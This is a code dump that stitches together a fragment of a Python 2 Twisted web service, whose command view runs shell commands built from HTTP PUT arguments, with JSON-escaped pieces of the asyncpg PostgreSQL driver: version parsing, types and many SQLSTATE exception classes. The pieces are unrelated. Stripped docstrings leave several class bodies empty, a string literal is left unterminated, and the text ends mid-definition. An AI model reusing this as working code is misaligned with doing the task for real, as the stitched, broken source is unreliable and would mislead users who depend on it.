search=db.get_root()['oms_root']['search'] res=SearchResult(search, q.decode('utf-8')) return IHttpRestView(res).render_GET(request) class StreamView(HttpRestView): context(StreamSubscriber) cached_subscriptions=dict() def rw_transaction(self, request): return False def render(self, request): timestamp=int(time.time() * 1000) oms_root=db.get_root()['oms_root'] limit=int(request.args.get('limit',['100'])[0]) after=int(request.args.get('after',['0'])[0]) subscription_hash=request.args.get('subscription_hash',[''])[0] if subscription_hash: if subscription_hash in self.cached_subscriptions: data=self.cached_subscriptions[subscription_hash] else: raise BadRequest(\\\"Unknown subscription hash\\\") elif not request.content.getvalue(): return{} else: data=json.load(request.content) subscription_hash=sha1(request.content.getvalue()).hexdigest() self.cached_subscriptions[subscription_hash]=data request.responseHeaders.addRawHeader('X-OMS-Subscription-Hash', subscription_hash) def val(r): objs, unresolved_path=traverse_path(oms_root, r) if unresolved_path: return[(timestamp, dict(event='delete', name=os.path.basename(r), url=r))] return IStream(objs[-1]).events(after, limit=limit) res=[list(reversed(val(resource))) for resource in data] res=[(i, v) for i, v in enumerate(res) if v] return[timestamp, dict(res)] class CommandView(DefaultView): context(ICommand) def write_results(self, request, pid, cmd): log.msg('Called %s got result: pid(%s) term writes=%s' %( cmd, pid, len(cmd.write_buffer)), system='command-view') request.write(json.dumps({'status': 'ok', 'pid': pid, 'stdout': cmd.write_buffer})) request.finish() def render_PUT(self, request): \\\"\\\"\\\" Converts arguments into command-line counterparts and executes the omsh command. Parameters passed as 'arg' are converted into positional arguments, others are converted into named parameters: PUT /bin/ls?arg=/some/path&arg=/another/path&-l&--recursive thus translates to: /bin/ls /some/path /another/path -l --recursive Allows blocking(synchronous) and non-blocking operation using the 'asynchronous' parameter(any value will trigger it). Synchronous operation requires two threads to function. \\\"\\\"\\\" def named_args_filter_and_flatten(nargs): for name, vallist in nargs: if name not in('arg', 'asynchronous'): for val in vallist: yield name yield val def convert_args(args): tokenized_args=args.get('arg',[]) return tokenized_args +list(named_args_filter_and_flatten(args.items())) protocol=DetachedProtocol() protocol.interaction=get_interaction(self.context) or request.interaction args=convert_args(request.args) args=filter(None, args) cmd=self.context.cmd(protocol) cmd.write_buffer=[] d0=defer.Deferred() try: pid=threads.blockingCallFromThread(reactor, cmd.register, d0, args, '%s %s' %(request.path, args)) except ArgumentParsingError, e: raise BadRequest(str(e)) q=Queue.Queue() def execute(cmd, args): d=defer.maybeDeferred(cmd, *args) d.addBoth(q.put) d.chainDeferred(d0) dt=threads.deferToThread(execute, cmd, args) if request.args.get('asynchronous',[]): reactor.callFromThread(self.write_results, request, pid, cmd) else: dt.addBoth(lambda r: threads.deferToThread(q.get, True, 60)) dt.addCallback(lambda r: reactor.callFromThread(self.write_results, request, pid, cmd)) def errhandler(e, pid, cmd): e.trap(ArgumentParsingError) raise BadRequest(str(e)) dt.addErrback(errhandler, pid, cmd) return NOT_DONE_YET \",\n          \"\\n\\nfrom __future__ import annotations\\n\\nimport re\\nimport typing\\n\\nfrom .types import ServerVersion\\n\\nversion_regex: typing.Final = re.compile(\\nr\\\"(Postgre[^\\\\s]*)?\\\\s*\\\"\\nr\\\"(?P<major>[0-9]+)\\\\.?\\\"\\nr\\\"((?P<minor>[0-9]+)\\\\.?)?\\\"\\nr\\\"(?P<micro>[0-9]+)?\\\"\\nr\\\"(?P<releaselevel>[a-z]+)?\\\"\\nr\\\"(?P<serial>[0-9]+)?\\\"\\n)\\n\\n\\nclass _VersionDict(typing.TypedDict):\\nmajor: int\\nminor: int | None\\nmicro: int | None\\nreleaselevel: str | None\\nserial: int | None\\n\\n\\ndef split_server_version_string(version_string: str) -> ServerVersion:\\nversion_match = version_regex.search(version_string)\\n\\nif version_match is None:\\nraise ValueError(\\n\\\"Unable to parse Postgres \\\"\\nf'version from \\\"{version_string}\\\"'\\n)\\n\\nversion: _VersionDict = version_match.groupdict()\\nfor ver_key, ver_value in version.items():\\ntry:\\nversion[ver_key] = int(ver_value)\\nexcept (TypeError, ValueError):\\npass\\n\\nif version[\\\"major\\\"] < 10:\\nreturn ServerVersion(\\nversion[\\\"major\\\"],\\nversion.get(\\\"minor\\\") or 0,\\nversion.get(\\\"micro\\\") or 0,\\nversion.get(\\\"releaselevel\\\") or \\\"final\\\",\\nversion.get(\\\"serial\\\") or 0,\\n)\\n\\nreturn ServerVersion(\\nversion[\\\"major\\\"],\\n0,\\nversion.get(\\\"minor\\\") or 0,\\nversion.get(\\\"releaselevel\\\") or \\\"final\\\",\\nversion.get(\\\"serial\\\") or 0,\\n)\\n\\nfrom __future__ import annotations\\n\\nimport typing\\n\\nfrom asyncpg.pgproto.types import (\\nBitString, Point, Path, Polygon,\\nBox, Line, LineSegment, Circle,\\n)\\n\\nif typing.TYPE_CHECKING:\\nfrom typing_extensions import Self\\n\\n\\n__all__ = (\\n'Type', 'Attribute', 'Range', 'BitString', 'Point', 'Path', 'Polygon',\\n'Box', 'Line', 'LineSegment', 'Circle', 'ServerVersion',\\n)\\n\\n\\nclass Type(typing.NamedTuple):\\noid: int\\nname: str\\nkind: str\\nschema: str\\n\\n\\nType.__doc__ = 'Database data type.'\\nType.oid.__doc__ = 'OID of the type.'\\nType.name.__doc__ = 'Type name.  For example \\\"int2\\\".'\\nType.kind.__doc__ = \\\\\\n'Type kind.  Can be \\\"scalar\\\", \\\"array\\\", \\\"composite\\\" or \\\"range\\\".'\\nType.schema.__doc__ = 'Name of the database schema that defines the type.'\\n\\n\\nclass Attribute(typing.NamedTuple):\\nname: str\\ntype: Type\\n\\n\\nAttribute.__doc__ = 'Database relation attribute.'\\nAttribute.name.__doc__ = 'Attribute name.'\\nAttribute.type.__doc__ = 'Attribute data type :class:`asyncpg.types.Type`.'\\n\\n\\nclass ServerVersion(typing.NamedTuple):\\nmajor: int\\nminor: int\\nmicro: int\\nreleaselevel: str\\nserial: int\\n\\n\\nServerVersion.__doc__ = 'PostgreSQL server version tuple.'\\n\\n\\nclass _RangeValue(typing.Protocol):\\ndef __eq__(self, __value: object) -> bool:\\n...\\n\\ndef __lt__(self, __other: _RangeValue) -> bool:\\n...\\n\\ndef __gt__(self, __other: _RangeValue) -> bool:\\n...\\n\\n\\n_RV = typing.TypeVar('_RV', bound=_RangeValue)\\n\\n\\nclass Range(typing.Generic[_RV]):\\n\\n\\nimport asyncpg\\nimport sys\\nimport textwrap\\n\\n\\n__all__ = ('PostgresError', 'FatalPostgresError', 'UnknownPostgresError',\\n'InterfaceError', 'InterfaceWarning', 'PostgresLogMessage',\\n'ClientConfigurationError',\\n'InternalClientError', 'OutdatedSchemaCacheError', 'ProtocolError',\\n'UnsupportedClientFeatureError', 'TargetServerAttributeNotMatched',\\n'UnsupportedServerFeatureError')\\n\\n\\ndef _is_asyncpg_class(cls):\\nmodname = cls.__module__\\nreturn modname == 'asyncpg' or modname.startswith('asyncpg.')\\n\\n\\nclass PostgresMessageMeta(type):\\n\\n_message_map = {}\\n_field_map = {\\n'S': 'severity',\\n'V': 'severity_en',\\n'C': 'sqlstate',\\n'M': 'message',\\n'D': 'detail',\\n'H': 'hint',\\n'P': 'position',\\n'p': 'internal_position',\\n'q': 'internal_query',\\n'W': 'context',\\n's': 'schema_name',\\n't': 'table_name',\\n'c': 'column_name',\\n'd': 'data_type_name',\\n'n': 'constraint_name',\\n'F': 'server_source_filename',\\n'L': 'server_source_line',\\n'R': 'server_source_function'\\n}\\n\\ndef __new__(mcls, name, bases, dct):\\ncls = super().__new__(mcls, name, bases, dct)\\nif cls.__module__ == mcls.__module__ and name == 'PostgresMessage':\\nfor f in mcls._field_map.values():\\nsetattr(cls, f, None)\\n\\nif _is_asyncpg_class(cls):\\nmod = sys.modules[cls.__module__]\\nif hasattr(mod, name):\\nraise RuntimeError('exception class redefinition: {}'.format(\\nname))\\n\\ncode = dct.get('sqlstate')\\nif code is not None:\\nexisting = mcls._message_map.get(code)\\nif existing is not None:\\nraise TypeError('{} has duplicate SQLSTATE code, which is'\\n'already defined by {}'.format(\\nname, existing.__name__))\\nmcls._message_map[code] = cls\\n\\nreturn cls\\n\\n@classmethod\\ndef get_message_class_for_sqlstate(mcls, code):\\nreturn mcls._message_map.get(code, UnknownPostgresError)\\n\\n\\nclass PostgresMessage(metaclass=PostgresMessageMeta):\\n\\n@classmethod\\ndef _get_error_class(cls, fields):\\nsqlstate = fields.get('C')\\nreturn type(cls).get_message_class_for_sqlstate(sqlstate)\\n\\n@classmethod\\ndef _get_error_dict(cls, fields, query):\\ndct = {\\n'query': query\\n}\\n\\nfield_map = type(cls)._field_map\\nfor k, v in fields.items():\\nfield = field_map.get(k)\\nif field:\\ndct[field] = v\\n\\nreturn dct\\n\\n@classmethod\\ndef _make_constructor(cls, fields, query=None):\\ndct = cls._get_error_dict(fields, query)\\n\\nexccls = cls._get_error_class(fields)\\nmessage = dct.get('message', '')\\n\\nis_icse = (\\nexccls.__name__ == 'FeatureNotSupportedError' and\\n_is_asyncpg_class(exccls) and\\ndct.get('server_source_function') == 'RevalidateCachedQuery'\\n)\\n\\nif is_icse:\\nexceptions = sys.modules[exccls.__module__]\\nexccls = exceptions.InvalidCachedStatementError\\nmessage = ('cached statement plan is invalid due to a database '\\n'schema or configuration change')\\n\\nis_prepared_stmt_error = (\\nexccls.__name__ in ('DuplicatePreparedStatementError',\\n'InvalidSQLStatementNameError') and\\n_is_asyncpg_class(exccls)\\n)\\n\\nif is_prepared_stmt_error:\\nhint = dct.get('hint', '')\\nhint += textwrap.dedent(\\\"\\\"\\\"\\\\\\n\\nNOTE: pgbouncer with pool_mode set to \\\"transaction\\\" or\\n\\\"statement\\\" does not support prepared statements properly.\\nYou have two options:\\n\\n* if you are using pgbouncer for connection pooling to a\\nsingle server, switch to the connection pool functionality\\nprovided by asyncpg, it is a much better option for this\\npurpose;\\n\\n* if you have no option of avoiding the use of pgbouncer,\\nthen you can set statement_cache_size to 0 when creating\\nthe asyncpg connection object.\\n\\ndef __str__(self):\\nmsg = self.args[0]\\nif self.detail:\\nmsg += '\\\\nDETAIL:  {}'.format(self.detail)\\nif self.hint:\\nmsg += '\\\\nHINT:  {}'.format(self.hint)\\n\\nreturn msg\\n\\n@classmethod\\ndef new(cls, fields, query=None):\\nexccls, message, dct = cls._make_constructor(fields, query)\\nex = exccls(message)\\nex.__dict__.update(dct)\\nreturn ex\\n\\n\\nclass FatalPostgresError(PostgresError):\\n\\n\\nclass InterfaceMessage:\\ndef __init__(self, *, detail=None, hint=None):\\nself.detail = detail\\nself.hint = hint\\n\\ndef __str__(self):\\nmsg = self.args[0]\\nif self.detail:\\nmsg += '\\\\nDETAIL:  {}'.format(self.detail)\\nif self.hint:\\nmsg += '\\\\nHINT:  {}'.format(self.hint)\\n\\nreturn msg\\n\\n\\nclass InterfaceError(InterfaceMessage, Exception):\\n\\n\\nclass DataError(InterfaceError, ValueError):\\n\\n\\nclass UnsupportedServerFeatureError(InterfaceError):\\n\\ndef __init__(self, msg, *, detail=None, hint=None):\\nInterfaceMessage.__init__(self, detail=detail, hint=hint)\\nUserWarning.__init__(self, msg)\\n\\n\\nclass InternalClientError(Exception):\\n\\n\\nclass TargetServerAttributeNotMatched(InternalClientError):\\n\\ndef __init__(self, msg, *, schema=None, data_type=None, position=None):\\nsuper().__init__(msg)\\nself.schema_name = schema\\nself.data_type_name = data_type\\nself.position = position\\n\\n\\nclass PostgresLogMessage(PostgresMessage):\\n\\n\\nimport re\\n\\n\\ndef _quote_ident(ident):\\nreturn '\\\"{}\\\"'.format(ident.replace('\\\"', '\\\"\\\"'))\\n\\n\\ndef _quote_literal(string):\\nreturn \\\"'{}'\\\".format(string.replace(\\\"'\\\", \\\"''\\\"))\\n\\n\\nasync def _mogrify(conn, query, args):\\n\\nfrom ._base import *\\nfrom . import _base\\n\\n\\nclass PostgresWarning(_base.PostgresLogMessage, Warning):\\nsqlstate = '01000'\\n\\n\\nclass DynamicResultSetsReturned(PostgresWarning):\\nsqlstate = '0100C'\\n\\n\\nclass ImplicitZeroBitPadding(PostgresWarning):\\nsqlstate = '01008'\\n\\n\\nclass NullValueEliminatedInSetFunction(PostgresWarning):\\nsqlstate = '01003'\\n\\n\\nclass PrivilegeNotGranted(PostgresWarning):\\nsqlstate = '01007'\\n\\n\\nclass PrivilegeNotRevoked(PostgresWarning):\\nsqlstate = '01006'\\n\\n\\nclass StringDataRightTruncation(PostgresWarning):\\nsqlstate = '01004'\\n\\n\\nclass DeprecatedFeature(PostgresWarning):\\nsqlstate = '01P01'\\n\\n\\nclass NoData(PostgresWarning):\\nsqlstate = '02000'\\n\\n\\nclass NoAdditionalDynamicResultSetsReturned(NoData):\\nsqlstate = '02001'\\n\\n\\nclass SQLStatementNotYetCompleteError(_base.PostgresError):\\nsqlstate = '03000'\\n\\n\\nclass PostgresConnectionError(_base.PostgresError):\\nsqlstate = '08000'\\n\\n\\nclass ConnectionDoesNotExistError(PostgresConnectionError):\\nsqlstate = '08003'\\n\\n\\nclass ConnectionFailureError(PostgresConnectionError):\\nsqlstate = '08006'\\n\\n\\nclass ClientCannotConnectError(PostgresConnectionError):\\nsqlstate = '08001'\\n\\n\\nclass ConnectionRejectionError(PostgresConnectionError):\\nsqlstate = '08004'\\n\\n\\nclass TransactionResolutionUnknownError(PostgresConnectionError):\\nsqlstate = '08007'\\n\\n\\nclass ProtocolViolationError(PostgresConnectionError):\\nsqlstate = '08P01'\\n\\n\\nclass TriggeredActionError(_base.PostgresError):\\nsqlstate = '09000'\\n\\n\\nclass FeatureNotSupportedError(_base.PostgresError):\\nsqlstate = '0A000'\\n\\n\\nclass InvalidCachedStatementError(FeatureNotSupportedError):\\npass\\n\\n\\nclass InvalidTransactionInitiationError(_base.PostgresError):\\nsqlstate = '0B000'\\n\\n\\nclass LocatorError(_base.PostgresError):\\nsqlstate = '0F000'\\n\\n\\nclass InvalidLocatorSpecificationError(LocatorError):\\nsqlstate = '0F001'\\n\\n\\nclass InvalidGrantorError(_base.PostgresError):\\nsqlstate = '0L000'\\n\\n\\nclass InvalidGrantOperationError(InvalidGrantorError):\\nsqlstate = '0LP01'\\n\\n\\nclass InvalidRoleSpecificationError(_base.PostgresError):\\nsqlstate = '0P000'\\n\\n\\nclass DiagnosticsError(_base.PostgresError):\\nsqlstate = '0Z000'\\n\\n\\nclass StackedDiagnosticsAccessedWithoutActiveHandlerError(DiagnosticsError):\\nsqlstate = '0Z002'\\n\\n\\nclass InvalidArgumentForXqueryError(_base.PostgresError):\\nsqlstate = '10608'\\n\\n\\nclass CaseNotFoundError(_base.PostgresError):\\nsqlstate = '20000'\\n\\n\\nclass CardinalityViolationError(_base.PostgresError):\\nsqlstate = '21000'\\n\\n\\nclass DataError(_base.PostgresError):\\nsqlstate = '22000'\\n\\n\\nclass ArraySubscriptError(DataError):\\nsqlstate = '2202E'\\n\\n\\nclass CharacterNotInRepertoireError(DataError):\\nsqlstate = '22021'\\n\\n\\nclass DatetimeFieldOverflowError(DataError):\\nsqlstate = '22008'\\n\\n\\nclass DivisionByZeroError(DataError):\\nsqlstate = '22012'\\n\\n\\nclass ErrorInAssignmentError(DataError):\\nsqlstate = '22005'\\n\\n\\nclass EscapeCharacterConflictError(DataError):\\nsqlstate = '2200B'\\n\\n\\nclass IndicatorOverflowError(DataError):\\nsqlstate = '22022'\\n\\n\\nclass IntervalFieldOverflowError(DataError):\\nsqlstate = '22015'\\n\\n\\nclass InvalidArgumentForLogarithmError(DataError):\\nsqlstate = '2201E'\\n\\n\\nclass InvalidArgumentForNtileFunctionError(DataError):\\nsqlstate = '22014'\\n\\n\\nclass InvalidArgumentForNthValueFunctionError(DataError):\\nsqlstate = '22016'\\n\\n\\nclass InvalidArgumentForPowerFunctionError(DataError):\\nsqlstate = '2201F'\\n\\n\\nclass InvalidArgumentForWidthBucketFunctionError(DataError):\\nsqlstate = '2201G'\\n\\n\\nclass InvalidCharacterValueForCastError(DataError):\\nsqlstate = '22018'\\n\\n\\nclass InvalidDatetimeFormatError(DataError):\\nsqlstate = '22007'\\n\\n\\nclass InvalidEscapeCharacterError(DataError):\\nsqlstate = '22019'\\n\\n\\nclass InvalidEscapeOctetError(DataError):\\nsqlstate = '2200D'\\n\\n\\nclass InvalidEscapeSequenceError(DataError):\\nsqlstate = '22025'\\n\\n\\nclass NonstandardUseOfEscapeCharacterError(DataError):\\nsqlstate = '22P06'\\n\\n\\nclass InvalidIndicatorParameterValueError(DataError):\\nsqlstate = '22010'\\n\\n\\nclass InvalidParameterValueError(DataError):\\nsqlstate = '22023'\\n\\n\\nclass InvalidPrecedingOrFollowingSizeError(DataError):\\nsqlstate = '22013'\\n\\n\\nclass InvalidRegularExpressionError(DataError):\\nsqlstate = '2201B'\\n\\n\\nclass InvalidRowCountInLimitClauseError(DataError):\\nsqlstate = '2201W'\\n\\n\\nclass InvalidRowCountInResultOffsetClauseError(DataError):\\nsqlstate = '2201X'\\n\\n\\nclass InvalidTablesampleArgumentError(DataError):\\nsqlstate = '2202H'\\n\\n\\nclass InvalidTablesampleRepeatError(DataError):\\nsqlstate = '2202G'\\n\\n\\nclass InvalidTimeZoneDisplacementValueError(DataError):\\nsqlstate = '22009'\\n\\n\\nclass InvalidUseOfEscapeCharacterError(DataError):\\nsqlstate = '2200C'\\n\\n\\nclass MostSpecificTypeMismatchError(DataError):\\nsqlstate = '2200G'\\n\\n\\nclass NullValueNotAllowedError(DataError):\\nsqlstate = '22004'\\n\\n\\nclass NullValueNoIndicatorParameterError(DataError):\\nsqlstate = '22002'\\n\\n\\nclass NumericValueOutOfRangeError(DataError):\\nsqlstate = '22003'\\n\\n\\nclass SequenceGeneratorLimitExceededError(DataError):\\nsqlstate = '2200H'\\n\\n\\nclass StringDataLengthMismatchError(DataError):\\nsqlstate = '22026'\\n\\n\\nclass StringDataRightTruncationError(DataError):\\nsqlstate = '22001'\\n\\n\\nclass SubstringError(DataError):\\nsqlstate = '22011'\\n\\n\\nclass TrimError(DataError):\\nsqlstate = '22027'\\n\\n\\nclass UnterminatedCStringError(DataError):\\nsqlstate = '22024'\\n\\n\\nclass ZeroLengthCharacterStringError(DataError):\\nsqlstate = '2200F'\\n\\n\\nclass PostgresFloatingPointError(DataError):\\nsqlstate = '22P01'\\n\\n\\nclass InvalidTextRepresentationError(DataError):\\nsqlstate = '22P02'\\n\\n\\nclass InvalidBinaryRepresentationError(DataError):\\nsqlstate = '22P03'\\n\\n\\nclass BadCopyFileFormatError(DataError):\\nsqlstate = '22P04'\\n\\n\\nclass UntranslatableCharacterError(DataError):\\nsqlstate = '22P05'\\n\\n\\nclass NotAnXmlDocumentError(DataError):\\nsqlstate = '2200L'\\n\\n\\nclass InvalidXmlDocumentError(DataError):\\nsqlstate = '2200M'\\n\\n\\nclass InvalidXmlContentError(DataError):\\nsqlstate = '2200N'\\n\\n\\nclass InvalidXmlCommentError(DataError):\\nsqlstate = '2200S'\\n\\n\\nclass InvalidXmlProcessingInstructionError(DataError):\\nsqlstate = '2200T'\\n\\n\\nclass DuplicateJsonObjectKeyValueError(DataError):\\nsqlstate = '22030'\\n\\n\\nclass InvalidArgumentForSQLJsonDatetimeFunctionError(DataError):\\nsqlstate = '22031'\\n\\n\\nclass InvalidJsonTextError(DataError):\\nsqlstate = '22032'\\n\\n\\nclass InvalidSQLJsonSubscriptError(DataError):\\nsqlstate = '22033'\\n\\n\\nclass MoreThanOneSQLJsonItemError(DataError):\\nsqlstate = '22034'\\n\\n\\nclass NoSQLJsonItemError(DataError):\\nsqlstate = '22035'\\n\\n\\nclass NonNumericSQLJsonItemError(DataError):\\nsqlstate = '22036'\\n\\n\\nclass NonUniqueKeysInAJsonObjectError(DataError):\\nsqlstate = '22037'\\n\\n\\nclass SingletonSQLJsonItemRequiredError(DataError):\\nsqlstate = '22038'\\n\\n\\nclass SQLJsonArrayNotFoundError(DataError):\\nsqlstate = '22039'\\n\\n\\nclass SQLJsonMemberNotFoundError(DataError):\\nsqlstate = '2203A'\\n\\n\\nclass SQLJsonNumberNotFoundError(DataError):\\nsqlstate = '2203B'\\n\\n\\nclass SQLJsonObjectNotFoundError(DataError):\\nsqlstate = '2203C'\\n\\n\\nclass TooManyJsonArrayElementsError(DataError):\\nsqlstate = '2203D'\\n\\n\\nclass TooManyJsonObjectMembersError(DataError):\\nsqlstate = '2203E'\\n\\n\\nclass SQLJsonScalarRequiredError(DataError):\\nsqlstate = '2203F'\\n\\n\\nclass SQLJsonItemCannotBeCastToTargetTypeError(DataError):\\nsqlstate = '2203G'\\n\\n\\nclass IntegrityConstraintViolationError(_base.PostgresError):\\nsqlstate = '23000'\\n\\n\\nclass RestrictViolationError(IntegrityConstraintViolationError):\\nsqlstate = '23001'\\n\\n\\nclass NotNullViolationError(IntegrityConstraintViolationError):\\nsqlstate = '23502'\\n\\n\\nclass ForeignKeyViolationError(IntegrityConstraintViolationError):\\nsqlstate = '23503'\\n\\n\\nclass UniqueViolationError(IntegrityConstraintViolationError):\\nsqlstate = '23505'\\n\\n\\nclass CheckViolationError(IntegrityConstraintViolationError):\\nsqlstate = '23514'\\n\\n\\nclass ExclusionViolationError(IntegrityConstraintViolationError):\\nsqlstate = '23P01'\\n\\n\\nclass InvalidCursorStateError(_base.PostgresError):\\nsqlstate = '24000'\\n\\n\\nclass InvalidTransactionStateError(_base.PostgresError):\\nsqlstate = '25000'\\n\\n\\nclass ActiveSQLTransactionError(InvalidTransactionStateError):\\nsqlstate = '25001'\\n\\n\\nclass BranchTransactionAlreadyActiveError(InvalidTransactionStateError):\\nsqlstate = '25002'\\n\\n\\nclass HeldCursorRequiresSameIsolationLevelError(InvalidTransactionStateError):\\nsqlstate = '25008'\\n\\n\\nclass InappropriateAccessModeForBranchTransactionError(\\nInvalidTransactionStateError):\\nsqlstate = '25003'\\n\\n\\nclass InappropriateIsolationLevelForBranchTransactionError(\\nInvalidTransactionStateError):\\nsqlstate = '25004'\\n\\n\\nclass NoActiveSQLTransactionForBranchTransactionError(\\nInvalidTransactionStateError):\\nsqlstate = '25005'\\n\\n\\nclass ReadOnlySQLTransactionError(InvalidTransactionStateError):\\nsqlstate = '25006'\\n\\n\\nclass SchemaAndDataStatementMixingNotSupportedError(\\nInvalidTransactionStateError):\\nsqlstate = '25007'\\n\\n\\nclass NoActiveSQLTransactionError(InvalidTransactionStateError):\\nsqlstate = '25P01'\\n\\n\\nclass InFailedSQLTransactionError(InvalidTransactionStateError):\\nsqlstate = '25P02'\\n\\n\\nclass IdleInTransactionSessionTimeoutError(InvalidTransactionStateError):\\nsqlstate = '25P03'\\n\\n\\nclass TransactionTimeoutError(InvalidTransactionStateError):\\nsqlstate = '25P04'\\n\\n\\nclass InvalidSQLStatementNameError(_base.PostgresError):\\nsqlstate = '26000'\\n\\n\\nclass TriggeredDataChangeViolationError(_base.PostgresError):\\nsqlstate = '27000'\\n\\n\\nclass InvalidAuthorizationSpecificationError(_base.PostgresError):\\nsqlstate = '28000'\\n\\n\\nclass InvalidPasswordError(InvalidAuthorizationSpecificationError):\\nsqlstate = '28P01'\\n\\n\\nclass DependentPrivilegeDescriptorsStillExistError(_base.PostgresError):\\nsqlstate = '2B000'\\n\\n\\nclass DependentObjectsStillExistError(\\nDependentPrivilegeDescriptorsStillExistError):\\nsqlstate = '2BP01'\\n\\n\\nclass InvalidTransactionTerminationError(_base.PostgresError):\\nsqlstate = '2D000'\\n\\n\\nclass SQLRoutineError(_base.PostgresError):\\nsqlstate = '2F000'\\n\\n\\nclass FunctionExecutedNoReturnStatementError(SQLRoutineError):\\nsqlstate = '2F005'\\n\\n\\nclass ModifyingSQLDataNotPermittedError(SQLRoutineError):\\nsqlstate = '2F002'\\n\\n\\nclass ProhibitedSQLStatementAttemptedError(SQLRoutineError):\\nsqlstate = '2F003'\\n\\n\\nclass ReadingSQLDataNotPermittedError(SQLRoutineError):\\nsqlstate = '2F004'\\n\\n\\nclass InvalidCursorNameError(_base.PostgresError):\\nsqlstate = '34000'\\n\\n\\nclass ExternalRoutineError(_base.PostgresError):\\nsqlstate = '38000'\\n\\n\\nclass ContainingSQLNotPermittedError(ExternalRoutineError):\\nsqlstate = '38001'\\n\\n\\nclass ModifyingExternalRoutineSQLDataNotPermittedError(ExternalRoutineError):\\nsqlstate = '38002'\\n\\n\\nclass ProhibitedExternalRoutineSQLStatementAttemptedError(\\nExternalRoutineError):\\nsqlstate = '38003'\\n\\n\\nclass ReadingExternalRoutineSQLDataNotPermittedError(ExternalRoutineError):\\nsqlstate = '38004'\\n\\n\\nclass ExternalRoutineInvocationError(_base.PostgresError):\\nsqlstate = '39000'\\n\\n\\nclass InvalidSqlstateReturnedError(ExternalRoutineInvocationError):\\nsqlstate = '39001'\\n\\n\\nclass NullValueInExternalRoutineNotAllowedError(\\nExternalRoutineInvocationError):\\nsqlstate = '39004'\\n\\n\\nclass TriggerProtocolViolatedError(ExternalRoutineInvocationError):\\nsqlstate = '39P01'\\n\\n\\nclass SrfProtocolViolatedError(ExternalRoutineInvocationError):\\nsqlstate = '39P02'\\n\\n\\nclass EventTriggerProtocolViolatedError(ExternalRoutineInvocationError):\\nsqlstate = '39P03'\\n\\n\\nclass SavepointError(_base.PostgresError):\\nsqlstate = '3B000'\\n\\n\\nclass InvalidSavepointSpecificationError(SavepointError):\\nsqlstate = '3B001'\\n\\n\\nclass InvalidCatalogNameError(_base.PostgresError):\\nsqlstate = '3D000'\\n\\n\\nclass InvalidSchemaNameError(_base.PostgresError):\\nsqlstate = '3F000'\\n\\n\\nclass TransactionRollbackError(_base.PostgresError):\\nsqlstate = '40000'\\n\\n\\nclass TransactionIntegrityConstraintViolationError(TransactionRollbackError):\\nsqlstate = '40002'\\n\\n\\nclass SerializationError(TransactionRollbackError):\\nsqlstate = '40001'\\n\\n\\nclass StatementCompletionUnknownError(TransactionRollbackError):\\nsqlstate = '40003'\\n\\n\\nclass DeadlockDetectedError(TransactionRollbackError):\\nsqlstate = '40P01'\\n\\n\\nclass SyntaxOrAccessError(_base.PostgresError):\\nsqlstate = '42000'\\n\\n\\nclass PostgresSyntaxError(SyntaxOrAccessError):\\nsqlstate = '42601'\\n\\n\\nclass InsufficientPrivilegeError(SyntaxOrAccessError):\\nsqlstate = '42501'\\n\\n\\nclass CannotCoerceError(SyntaxOrAccessError):\\nsqlstate = '42846'\\n\\n\\nclass GroupingError(SyntaxOrAccessError):\\nsqlstate = '42803'\\n\\n\\nclass WindowingError(SyntaxOrAccessError):\\nsqlstate = '42P20'\\n\\n\\nclass InvalidRecursionError(SyntaxOrAccessError):\\nsqlstate = '42P19'\\n\\n\\nclass InvalidForeignKeyError(SyntaxOrAccessError):\\nsqlstate = '42830'\\n\\n\\nclass InvalidNameError(SyntaxOrAccessError):\\nsqlstate = '42602'\\n\\n\\nclass NameTooLongError(SyntaxOrAccessError):\\nsqlstate = '42622'\\n\\n\\nclass ReservedNameError(SyntaxOrAccessError):\\nsqlstate = '42939'\\n\\n\\nclass DatatypeMismatchError(SyntaxOrAccessError):\\nsqlstate = '42804'\\n\\n\\nclass IndeterminateDatatypeError(SyntaxOrAccessError):\\nsqlstate = '42P18'\\n\\n\\nclass CollationMismatchError(SyntaxOrAccessError):\\nsqlstate = '42P21'\\n\\n\\nclass IndeterminateCollationError(SyntaxOrAccessError):\\nsqlstate = '42P22'\\n\\n\\nclass WrongObjectTypeError(SyntaxOrAccessError):\\nsqlstate = '42809'\\n\\n\\nclass GeneratedAlwaysError(SyntaxOrAccessError):\\nsqlstate = '428C9'\\n\\n\\nclass UndefinedColumnError(SyntaxOrAccessError):\\nsqlstate = '42703'\\n\\n\\nclass UndefinedFunctionError(SyntaxOrAccessError):\\nsqlstate = '42883'\\n\\n\\nclass UndefinedTableError(SyntaxOrAccessError):\\nsqlstate = '42P01'\\n\\n\\nclass UndefinedParameterError(SyntaxOrAccessError):\\nsqlstate = '42P02'\\n\\n\\nclass UndefinedObjectError(SyntaxOrAccessError):\\nsqlstate = '42704'\\n\\n\\nclass DuplicateColumnError(SyntaxOrAccessError):\\nsqlstate = '42701'\\n\\n\\nclass DuplicateCursorError(SyntaxOrAccessError):\\nsqlstate = '42P03'\\n\\n\\nclass DuplicateDatabaseError(SyntaxOrAccessError):\\nsqlstate = '42P04'\\n\\n\\nclass DuplicateFunctionError(SyntaxOrAccessError):\\nsqlstate = '42723'\\n\\n\\nclass DuplicatePreparedStatementError(SyntaxOrAccessError):\\nsqlstate = '42P05'\\n\\n\\nclass DuplicateSchemaError(SyntaxOrAccessError):\\nsqlstate = '42P06'\\n\\n\\nclass DuplicateTableError(SyntaxOrAccessError):\\nsqlstate = '42P07'\\n\\n\\nclass DuplicateAliasError(SyntaxOrAccessError):\\nsqlstate = '42712'\\n\\n\\nclass DuplicateObjectError(SyntaxOrAccessError):\\nsqlstate = '42710'\\n\\n\\nclass AmbiguousColumnError(SyntaxOrAccessError):\\nsqlstate = '42702'\\n\\n\\nclass AmbiguousFunctionError(SyntaxOrAccessError):\\nsqlstate = '42725'\\n\\n\\nclass AmbiguousParameterError(SyntaxOrAccessError):\\nsqlstate = '42P08'\\n\\n\\nclass AmbiguousAliasError(SyntaxOrAccessError):\\nsqlstate = '42P09'\\n\\n\\nclass InvalidColumnReferenceError(SyntaxOrAccessError):\\nsqlstate = '42P10'\\n\\n\\nclass InvalidColumnDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42611'\\n\\n\\nclass InvalidCursorDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P11'\\n\\n\\nclass InvalidDatabaseDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P12'\\n\\n\\nclass InvalidFunctionDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P13'\\n\\n\\nclass InvalidPreparedStatementDefinitionError(SyntaxOrAccessError):\\nsqlstate = '42P14'\\n\\n\\nclass 